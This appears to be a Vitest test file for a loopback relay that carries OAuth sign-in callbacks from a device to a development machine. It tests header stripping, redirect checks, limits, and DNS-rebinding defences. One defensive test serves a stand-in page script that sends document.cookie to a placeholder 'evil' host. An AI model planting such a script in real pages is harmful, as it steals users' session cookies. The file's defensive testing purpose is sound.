import { afterEach, describe, expect, it } from 'vitest';
import { createServer, request, type Server } from 'node:http';
import { agentRelayLimits, type AgentLoginRelayRequest } from '@brigadir/core';
import { CallbackListener, relayLocation, relayRequestOf, relayToLoopback } from './callback';

let servers: Server[] = [];
let listeners: CallbackListener[] = [];
afterEach(async () => {
	for (const listener of listeners) listener.close();
	await Promise.all(servers.map((server) => new Promise((resolve) => server.close(resolve))));
	servers = [];
	listeners = [];
});
/** The sign-in's own server on «the machine»: records what reached it. */
async function signInServer(
	answer: (
		url: string,
		headers: Record<string, unknown>
	) => { status: number; headers?: Record<string, string>; body?: string | Buffer; hang?: boolean }
) {
	const seen: { method: string; url: string; headers: Record<string, unknown> }[] = [];
	const server = createServer((incoming, response) => {
		seen.push({ method: incoming.method!, url: incoming.url!, headers: incoming.headers });
		const reply = answer(incoming.url!, incoming.headers);
		if (reply.hang) return;
		response.writeHead(reply.status, reply.headers);
		response.end(reply.body);
	});
	servers.push(server);
	await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
	return { port: (server.address() as { port: number }).port, seen };
}
const get = (
	path: string,
	headers: AgentLoginRelayRequest['headers'] = {}
): AgentLoginRelayRequest => ({
	method: 'GET',
	path,
	headers,
});
function fetchLocal(port: number, path: string, method = 'GET', host?: string) {
	return new Promise<{ status: number; headers: Record<string, unknown>; body: string }>(
		(resolve, reject) => {
			const outgoing = request(
				{
					host: '127.0.0.1',
					port,
					path,
					method,
					headers: { cookie: 'secret=1', accept: 'text/html', ...(host ? { host } : {}) },
				},
				(response) => {
					const chunks: Buffer[] = [];
					response.on('data', (chunk) => chunks.push(chunk));
					response.on('end', () =>
						resolve({
							status: response.statusCode!,
							headers: response.headers,
							body: Buffer.concat(chunks).toString(),
						})
					);
				}
			);
			outgoing.on('error', reject);
			outgoing.end();
		}
	);
}

describe('agent sign-in from a device: the way back (spec/remote-access-and-mobile#networking)', () => {
	it('the machine asks only its own loopback port, with the allowed headers, and keeps a location on the same server', async () => {
		const machine = await signInServer((url) =>
			url.startsWith('/auth/callback')
				? {
						status: 302,
						headers: {
							location: `http://localhost:${0}/success`,
							'set-cookie': 'a=b',
							'content-type': 'text/plain',
						},
						body: 'moved',
					}
				: { status: 200, headers: { 'content-type': 'text/html' }, body: '<p>Signed in</p>' }
		);
		const redirect = { host: 'localhost', port: machine.port, path: '/auth/callback' };
		const answer = await relayToLoopback(
			redirect,
			get('/auth/callback?code=abc&state=s', { accept: 'text/html', 'user-agent': 'Device' })
		);
		expect(answer.status).toBe(302);
		expect(answer.headers).toEqual({ 'content-type': 'text/plain' });
		expect(new TextDecoder().decode(answer.body)).toBe('moved');
		expect(machine.seen[0]).toMatchObject({
			method: 'GET',
			url: '/auth/callback?code=abc&state=s',
		});
		expect(machine.seen[0]!.headers).toMatchObject({
			host: `localhost:${machine.port}`,
			accept: 'text/html',
			'user-agent': 'Device',
		});
		expect(machine.seen[0]!.headers.cookie).toBeUndefined();
		expect(relayLocation(`http://localhost:${machine.port}/success?x=1`, redirect)).toBe(
			'/success?x=1'
		);
		expect(relayLocation('/success', redirect)).toBe('/success');
		expect(relayLocation('//evil.com/x', redirect)).toBeNull();
		expect(relayLocation('https://evil.com/x', redirect)).toBeNull();
		expect(relayLocation(`http://localhost:${machine.port + 1}/x`, redirect)).toBeNull();
	});
	it('refuses a bad request, cuts a large answer and gives up on a silent server', async () => {
		const machine = await signInServer((url) =>
			url === '/big'
				? { status: 200, body: Buffer.alloc(agentRelayLimits.bodyBytes + 10) }
				: url === '/hang'
					? { status: 200, hang: true }
					: { status: 200, body: 'ok' }
		);
		const redirect = { host: '127.0.0.1', port: machine.port, path: '/' };
		await expect(
			relayToLoopback(redirect, { method: 'POST', path: '/x', headers: {} } as never)
		).rejects.toThrow(/not valid/);
		await expect(relayToLoopback(redirect, get('/big'))).rejects.toThrow(/too large/);
		await expect(relayToLoopback(redirect, get('/hang'), 300)).rejects.toThrow(/in time/);
	});
	it('the device listens on loopback once, passes 16 requests at most, drops other methods and headers', async () => {
		const relayed: AgentLoginRelayRequest[] = [];
		let closed = 0;
		const listener = new CallbackListener(
			async (relayedRequest) => {
				relayed.push(relayedRequest);
				return {
					status: 200,
					headers: { 'content-type': 'text/html' },
					body: new TextEncoder().encode('<p>Done</p>'),
				};
			},
			() => closed++
		);
		listeners.push(listener);
		const taken = await signInServer(() => ({ status: 200 }));
		// A port this computer already uses: no listener, the page still opens.
		expect(
			await new CallbackListener(async () => ({
				status: 200,
				headers: {},
				body: new Uint8Array(),
			})).listen(taken.port)
		).toBe(false);
		expect(await listener.listen(0)).toBe(true);
		const port = listener.port!;
		const ok = await fetchLocal(port, '/auth/callback?code=1');
		expect(ok).toMatchObject({ status: 200, body: '<p>Done</p>' });
		expect(relayed[0]).toEqual(get('/auth/callback?code=1', { accept: 'text/html' }));
		expect((await fetchLocal(port, '/x', 'POST')).status).toBe(405);
		for (let index = 1; index < agentRelayLimits.requests; index++)
			await fetchLocal(port, '/again');
		expect((await fetchLocal(port, '/over')).status).toBe(429);
		expect(relayed).toHaveLength(agentRelayLimits.requests);
		listener.close();
		expect(closed).toBe(1);
		await expect(fetchLocal(port, '/after')).rejects.toThrow();
	});
	it('closes by itself when its time is up, and answers 502 when the machine cannot be reached', async () => {
		const listener = new CallbackListener(async () => {
			throw new Error('Not connected to studio.');
		});
		listeners.push(listener);
		expect(await listener.listen(0, 200)).toBe(true);
		const port = listener.port!;
		expect((await fetchLocal(port, '/auth/callback')).status).toBe(502);
		await new Promise((resolve) => setTimeout(resolve, 300));
		await expect(fetchLocal(port, '/late')).rejects.toThrow();
		expect(relayRequestOf({ method: 'DELETE', url: '/', headers: {} })).toBeNull();
		expect(
			relayRequestOf({ method: 'GET', url: '/a', headers: { cookie: 'x', accept: 'y' } })
		).toEqual(get('/a', { accept: 'y' }));
	});
});

describe('security review R2–R4, V6: the device’s sign-in listener', () => {
	it('answers only its own loopback name, and the page it relays runs without the device’s localhost origin', async () => {
		const relayed: string[] = [];
		const listener = new CallbackListener(async (request) => {
			relayed.push(request.path);
			return {
				status: 200,
				headers: { 'content-type': 'text/html' },
				body: new TextEncoder().encode('<script>fetch("//evil/?" + document.cookie)</script>'),
			};
		});
		listeners.push(listener);
		expect(await listener.listen(0)).toBe(true);
		const port = listener.port!;
		// DNS rebinding: a site of the device's browser that resolves to 127.0.0.1 reads nothing from the machine.
		expect((await fetchLocal(port, '/rebound', 'GET', `evil.example:${port}`)).status).toBe(421);
		expect(relayed).toEqual([]);
		for (const host of [`localhost:${port}`, `127.0.0.1:${port}`, `[::1]:${port}`]) {
			const answer = await fetchLocal(port, '/auth/callback', 'GET', host);
			expect(answer.status).toBe(200);
			// An opaque origin: the machine's page reads no cookie of the device's localhost, whatever port set it.
			expect(answer.headers['content-security-policy']).toMatch(/sandbox/);
			expect(answer.headers['x-content-type-options']).toBe('nosniff');
		}
	});
});
